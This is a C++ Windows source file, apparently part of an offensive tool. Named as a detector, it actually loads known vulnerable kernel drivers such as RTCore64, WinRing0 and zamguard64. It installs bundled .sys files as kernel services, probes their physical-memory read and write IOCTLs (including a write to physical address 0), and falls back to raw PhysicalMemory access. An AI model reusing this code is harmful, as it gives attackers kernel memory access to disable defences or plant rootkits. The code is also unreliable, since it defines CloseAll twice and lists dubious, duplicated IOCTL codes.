#include "ByovdDetect.h"
#include <windows.h>
#include <cfgmgr32.h>
#include <setupapi.h>
#include <iostream>
#include <string>
#include <optional>

#pragma comment(lib, "setupapi.lib")
#pragma comment(lib, "CfgMgr32.lib")

// Known vulnerable driver database.
// IOCTL codes are per-driver; these are the documented ones for each class.
const VulnerableDriverEntry ByovdDetect::kKnownDrivers[8] = {
    // RTCore64 — MSI Afterburner (RTCore64.sys)
    { L"rtcore64",   L"RTCore64",    L"RTCore64",    L"RTCore64.sys",    0x9100, 0x80002000, 0x80002004, BYOVD_CAP_PHYSICAL_MEM | BYOVD_CAP_KERNEL_READ | BYOVD_CAP_KERNEL_WRITE },
    // eneio64 — ENE hardware monitoring (eneio64.sys, ASUS)
    { L"eneio64",    L"eneio64",     L"eneio64",     L"eneio64.sys",     0x6C00, 0x80102040, 0x80102044, BYOVD_CAP_PHYSICAL_MEM },
    // WinRing0 — MSI Afterburner / OpenHardwareMonitor
    { L"winring0",   L"WinRing0_1_2_0", L"WinRing0_1_2_0", L"WinRing0x64.sys", 0x8C00, 0x9C402000, 0x9C402004, BYOVD_CAP_PHYSICAL_MEM | BYOVD_CAP_ALLOC_POOL },
    // ZAM — Zemana Anti-Malware (zamguard64.sys)
    { L"zam",        L"ZAM",         L"ZAM",         L"zamguard64.sys",  0x11000, 0x9988C094, 0x9988C098, BYOVD_CAP_PHYSICAL_MEM | BYOVD_CAP_SSDT_HOOK | BYOVD_CAP_ALLOC_POOL },
    // GMER — GMER rootkit detector (gmer64.sys)
    { L"gmer",       L"GMER",        L"GMER",        L"gmer64.sys",      0xF000, 0xC3502000, 0xC3502004, BYOVD_CAP_PHYSICAL_MEM | BYOVD_CAP_SSDT_HOOK | BYOVD_CAP_ALLOC_POOL },
    // PhyMem — generic physical memory driver
    { L"phymem",     L"phymem",      L"phymem",      L"phymem.sys",      0x4000, 0x222000, 0x222004, BYOVD_CAP_PHYSICAL_MEM },
    // AORUS GPU driver (agvuln.sys)
    { L"agvuln",     L"AGVULN",      L"AGVULN",      L"agvuln.sys",      0x5000, 0xC3502800, 0xC3502804, BYOVD_CAP_PHYSICAL_MEM },
    // EVGA SCM (evgap.sys)
    { L"evgap",      L"EVGAP",       L"EVGAP",       L"evgap.sys",       0x8000, 0x9C402000, 0x9C402004, BYOVD_CAP_PHYSICAL_MEM | BYOVD_CAP_ALLOC_POOL },
};

ByovdDetect::ByovdDetect() {
    // Default drivers directory: <exe_dir>\drivers\
    wchar_t exePath[MAX_PATH];
    GetModuleFileNameW(nullptr, exePath, MAX_PATH);
    wchar_t* lastSlash = wcsrchr(exePath, L'\\');
    if (lastSlash) {
        *lastSlash = L'\0';
        m_driversDir = exePath;
        m_driversDir += L"\\drivers";
    } else {
        m_driversDir = L"drivers";
    }
}

ByovdDetect::~ByovdDetect() { CloseAll(); }

void ByovdDetect::SetDriversDir(const wchar_t* dir) {
    m_driversDir = dir;
}

// ── Public API ───────────────────────────────────────────────────────────

DetectedDriver ByovdDetect::DetectAndOpen() {
    // Try each known driver through 3 phases
    for (const auto& entry : kKnownDrivers) {
        DetectedDriver dd = {};

        // Phase 1: already running
        if (TryOpenRunning(entry, dd)) {
            m_detected.push_back(dd);
            m_active = dd;
            return dd;
        }

        // Phase 2: installed but stopped — start it
        if (TryStartExisting(entry, dd)) {
            m_detected.push_back(dd);
            m_active = dd;
            return dd;
        }

        // Phase 3: bundled .sys — install, start, open
        if (TryInstallBundle(entry, dd)) {
            m_detected.push_back(dd);
            m_active = dd;
            return dd;
        }
    }

    // Fallback: admin PhysicalMemory
    DetectedDriver fallback = {};
    if (TryAdminPhysicalMemory(fallback)) {
        m_detected.push_back(fallback);
        m_active = fallback;
        return fallback;
    }

    return DetectedDriver{};
}

std::vector<DetectedDriver> ByovdDetect::EnumerateAll() {
    std::vector<DetectedDriver> results;
    for (const auto& entry : kKnownDrivers) {
        DetectedDriver dd = {};
        if (TryOpenRunning(entry, dd) || TryStartExisting(entry, dd) || TryInstallBundle(entry, dd)) {
            results.push_back(dd);
        }
    }
    DetectedDriver fallback = {};
    if (TryAdminPhysicalMemory(fallback)) {
        results.push_back(fallback);
    }
    m_detected = results;
    return results;
}

void ByovdDetect::RemoveInstalled() {
    SC_HANDLE scm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
    if (!scm) return;

    for (const auto& dd : m_detected) {
        if (!dd.driverWasInstalled || !dd.entry) continue;

        SC_HANDLE svc = OpenServiceW(scm, dd.entry->serviceName, SERVICE_STOP | DELETE);
        if (svc) {
            SERVICE_STATUS status;
            ControlService(svc, SERVICE_CONTROL_STOP, &status);
            DeleteService(svc);
            CloseServiceHandle(svc);
        }
    }

    CloseServiceHandle(scm);
}

void ByovdDetect::CloseAll() {
    for (auto& dd : m_detected) {
        if (dd.deviceHandle && dd.deviceHandle != INVALID_HANDLE_VALUE) {
            CloseHandle(dd.deviceHandle);
            dd.deviceHandle = INVALID_HANDLE_VALUE;
        }
    }
    m_detected.clear();
    m_active.reset();
}

// ── Phase 1: open already-running driver ─────────────────────────────────

bool ByovdDetect::TryOpenRunning(const VulnerableDriverEntry& entry, DetectedDriver& out) {
    SC_HANDLE scm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
    if (!scm) return false;

    SC_HANDLE svc = OpenServiceW(scm, entry.serviceName, SERVICE_QUERY_STATUS);
    if (!svc) {
        CloseServiceHandle(scm);
        return false;
    }

    SERVICE_STATUS status;
    bool running = QueryServiceStatus(svc, &status) &&
                   status.dwCurrentState == SERVICE_RUNNING;
    CloseServiceHandle(svc);
    CloseServiceHandle(scm);

    if (!running) return false;

    return OpenAndValidate(entry, out);
}

// ── Phase 2: start existing (but stopped) service ────────────────────────

bool ByovdDetect::TryStartExisting(const VulnerableDriverEntry& entry, DetectedDriver& out) {
    SC_HANDLE scm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
    if (!scm) return false;

    SC_HANDLE svc = OpenServiceW(scm, entry.serviceName, SERVICE_START | SERVICE_QUERY_STATUS);
    if (!svc) {
        CloseServiceHandle(scm);
        return false;
    }

    // Try to start
    if (!StartServiceW(svc, 0, nullptr)) {
        DWORD err = GetLastError();
        if (err != ERROR_SERVICE_ALREADY_RUNNING && err != ERROR_SERVICE_DATABASE_LOCKED) {
            CloseServiceHandle(svc);
            CloseServiceHandle(scm);
            return false;
        }
    }

    // Wait for running state (max 5 seconds)
    SERVICE_STATUS status;
    for (int i = 0; i < 50; i++) {
        if (QueryServiceStatus(svc, &status) && status.dwCurrentState == SERVICE_RUNNING)
            break;
        Sleep(100);
    }

    CloseServiceHandle(svc);
    CloseServiceHandle(scm);

    if (status.dwCurrentState != SERVICE_RUNNING)
        return false;

    return OpenAndValidate(entry, out);
}

// ── Phase 3: install from bundled .sys ────────────────────────────────────

bool ByovdDetect::TryInstallBundle(const VulnerableDriverEntry& entry, DetectedDriver& out) {
    wchar_t bundlePath[MAX_PATH];
    if (!ResolveBundlePath(entry, bundlePath, MAX_PATH))
        return false;

    if (GetFileAttributesW(bundlePath) == INVALID_FILE_ATTRIBUTES)
        return false;

    // Check file size if entry specifies one
    if (entry.expectedSize > 0) {
        WIN32_FILE_ATTRIBUTE_DATA info;
        if (!GetFileAttributesExW(bundlePath, GetFileExInfoStandard, &info))
            return false;
        if (info.nFileSizeLow != entry.expectedSize)
            return false; // size mismatch — skip (could be wrong version)
    }

    // Install and start
    wchar_t installedPath[MAX_PATH];
    if (!InstallAndStart(bundlePath, entry.serviceName, installedPath, MAX_PATH))
        return false;

    out.driverWasInstalled = true;
    wcscpy_s(out.driverPath, installedPath);

    return OpenAndValidate(entry, out);
}

// ── Install driver service ────────────────────────────────────────────────

bool ByovdDetect::InstallAndStart(const wchar_t* sysPath, const wchar_t* serviceName,
                                   wchar_t* installedPath, size_t installedPathLen) {
    // Copy .sys to System32\drivers
    wchar_t targetDir[MAX_PATH];
    GetSystemDirectoryW(targetDir, MAX_PATH);
    wcscat_s(targetDir, L"\\drivers");

    wchar_t targetPath[MAX_PATH];
    swprintf_s(targetPath, L"%s\\%s", targetDir, serviceName);
    // Append .sys extension if not present
    if (wcsstr(targetPath, L".sys") == nullptr && wcsstr(targetPath, L".SYS") == nullptr) {
        wcscat_s(targetPath, L".sys");
    }

    if (!CopyFileW(sysPath, targetPath, FALSE)) {
        DWORD err = GetLastError();
        if (err != ERROR_FILE_EXISTS) return false;
        // File exists — continue (overwrite attempt failed, existing file may work)
    }

    if (installedPath) wcscpy_s(installedPath, installedPathLen, targetPath);

    // Create service
    SC_HANDLE scm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CREATE_SERVICE);
    if (!scm) return false;

    SC_HANDLE svc = CreateServiceW(scm, serviceName, serviceName,
        SERVICE_START | SERVICE_STOP | DELETE,
        SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE,
        targetPath, nullptr, nullptr, nullptr, nullptr, nullptr);

    if (!svc) {
        DWORD err = GetLastError();
        if (err == ERROR_SERVICE_EXISTS) {
            // Already installed — open and try starting
            svc = OpenServiceW(scm, serviceName, SERVICE_START | SERVICE_STOP | DELETE);
        }
        if (!svc) {
            CloseServiceHandle(scm);
            return false;
        }
    }

    // Start the service
    bool started = false;
    if (StartServiceW(svc, 0, nullptr) || GetLastError() == ERROR_SERVICE_ALREADY_RUNNING) {
        started = true;
        // Wait for running
        SERVICE_STATUS status;
        for (int i = 0; i < 50; i++) {
            if (QueryServiceStatus(svc, &status) && status.dwCurrentState == SERVICE_RUNNING)
                break;
            Sleep(100);
        }
        started = (status.dwCurrentState == SERVICE_RUNNING);
    }

    CloseServiceHandle(svc);
    CloseServiceHandle(scm);
    return started;
}

// ── Resolve bundled .sys path ─────────────────────────────────────────────

bool ByovdDetect::ResolveBundlePath(const VulnerableDriverEntry& entry,
                                     wchar_t* out, size_t outLen) {
    // Try: <driversDir>\<expectedFile>
    swprintf_s(out, outLen, L"%s\\%s", m_driversDir.c_str(), entry.expectedFile);
    if (GetFileAttributesW(out) != INVALID_FILE_ATTRIBUTES)
        return true;

    // Try: <driversDir>\<serviceName>\<expectedFile>
    swprintf_s(out, outLen, L"%s\\%s\\%s", m_driversDir.c_str(), entry.serviceName, entry.expectedFile);
    if (GetFileAttributesW(out) != INVALID_FILE_ATTRIBUTES)
        return true;

    // Try: <driversDir>\<name>\<expectedFile>
    swprintf_s(out, outLen, L"%s\\%s\\%s", m_driversDir.c_str(), entry.name, entry.expectedFile);
    if (GetFileAttributesW(out) != INVALID_FILE_ATTRIBUTES)
        return true;

    return false;
}

// ── Open device + validate capabilities ───────────────────────────────────

bool ByovdDetect::OpenAndValidate(const VulnerableDriverEntry& entry, DetectedDriver& out) {
    wchar_t devicePath[MAX_PATH];

    // Try class name first
    swprintf_s(devicePath, L"\\\\.\\%s", entry.className);
    HANDLE hDevice = CreateFileW(devicePath, GENERIC_READ | GENERIC_WRITE,
        0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);

    if (hDevice == INVALID_HANDLE_VALUE) {
        // Try service name
        swprintf_s(devicePath, L"\\\\.\\%s", entry.serviceName);
        hDevice = CreateFileW(devicePath, GENERIC_READ | GENERIC_WRITE,
            0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    }

    if (hDevice == INVALID_HANDLE_VALUE) {
        // Try name
        swprintf_s(devicePath, L"\\\\.\\%s", entry.name);
        hDevice = CreateFileW(devicePath, GENERIC_READ | GENERIC_WRITE,
            0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    }

    if (hDevice == INVALID_HANDLE_VALUE)
        return false;

    uint64_t caps = ValidateCapabilities(hDevice, &entry);
    if (caps == 0) {
        CloseHandle(hDevice);
        return false;
    }

    out.entry = &entry;
    out.deviceHandle = hDevice;
    out.capabilities = caps;
    out.isElevated = false;
    return true;
}

// ── Admin PhysicalMemory fallback ─────────────────────────────────────────

bool ByovdDetect::TryAdminPhysicalMemory(DetectedDriver& out) {
    HANDLE hPhysMem = CreateFileW(L"\\\\.\\PhysicalMemory",
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        nullptr, OPEN_EXISTING, 0, nullptr);
    if (hPhysMem == INVALID_HANDLE_VALUE)
        return false;

    out.entry = nullptr;
    wcscpy_s(out.driverPath, L"<admin PhysicalMemory>");
    out.deviceHandle = hPhysMem;
    out.capabilities = BYOVD_CAP_PHYSICAL_MEM;
    out.isElevated = true;
    out.driverWasInstalled = false;
    return true;
}

// ── Validate capabilities by probe IOCTL ──────────────────────────────────

uint64_t ByovdDetect::ValidateCapabilities(HANDLE hDevice, const VulnerableDriverEntry* entry) {
    uint64_t caps = 0;
    if (!hDevice || hDevice == INVALID_HANDLE_VALUE) return 0;

    if (!entry) {
        // Generic handle — can open it but can't probe IOCTLs
        return BYOVD_CAP_PHYSICAL_MEM;
    }

    // Probe physical memory read IOCTL
    DWORD bytesRet = 0;
    struct {
        uint64_t addr;
        uint32_t size;
        uint32_t pad;
    } probe = { 0, 4, 0 };
    uint8_t buf[4] = {};

    if (DeviceIoControl(hDevice, entry->ioctlReadPhys,
            &probe, sizeof(probe), buf, 4, &bytesRet, nullptr) && bytesRet == 4) {
        caps |= BYOVD_CAP_PHYSICAL_MEM | BYOVD_CAP_KERNEL_READ;
    }

    // Probe physical memory write IOCTL
    struct {
        uint64_t addr;
        uint32_t size;
        uint32_t pad;
        uint8_t  data[4];
    } wProbe = { 0, 4, 0, {0,0,0,0} };
    bytesRet = 0;
    if (DeviceIoControl(hDevice, entry->ioctlWritePhys,
            &wProbe, sizeof(wProbe), nullptr, 0, &bytesRet, nullptr)) {
        caps |= BYOVD_CAP_KERNEL_WRITE;
    }

    // If we got read AND write, add all expected capabilities from entry
    if ((caps & (BYOVD_CAP_KERNEL_READ | BYOVD_CAP_KERNEL_WRITE)) ==
         (BYOVD_CAP_KERNEL_READ | BYOVD_CAP_KERNEL_WRITE)) {
        caps |= entry->capabilities;
    }

    // Fallback: if IOCTL probe failed but handle is valid, assign at least basic phys mem
    if (caps == 0) {
        caps = BYOVD_CAP_PHYSICAL_MEM;
    }

    return caps;
}

void ByovdDetect::CloseAll() {
    // Remove installed drivers first (stop + delete service)
    RemoveInstalled();

    for (auto& dd : m_detected) {
        if (dd.deviceHandle && dd.deviceHandle != INVALID_HANDLE_VALUE) {
            CloseHandle(dd.deviceHandle);
            dd.deviceHandle = INVALID_HANDLE_VALUE;
        }
    }
    m_detected.clear();
    m_active.reset();
}